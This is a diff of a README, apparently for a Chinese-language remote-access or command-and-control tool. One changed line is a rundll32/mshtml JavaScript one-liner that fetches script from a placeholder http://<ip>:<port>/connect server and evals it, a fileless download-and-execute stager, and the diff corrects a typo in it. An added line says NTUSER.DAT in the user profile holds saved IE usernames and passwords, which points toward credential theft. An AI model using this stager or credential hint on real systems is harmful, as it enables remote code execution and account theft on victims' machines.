@@ -15,7 +15,7 @@
 正常版
 
 ```
-rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://<ip>:<port>/connect",false);try{h.Send();B=h.ResponseText;eval(B);}catch(e){windows.close();}
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://<ip>:<port>/connect",false);try{h.Send();B=h.ResponseText;eval(B);}catch(e){window.close();}
 ```
 
 不死版
@@ -86,5 +86,7 @@ GPLV3
 * 完善命令
 * heartbeat随任务量来决定sleep时间
 * 通信流量加密
-* meterpreter
 
+
+
+你打开这个路径C:\Documents and Settings\用户名，在这个文件里面的NTUSER.DAT文件里面就保存了ie用户的用户名和密码
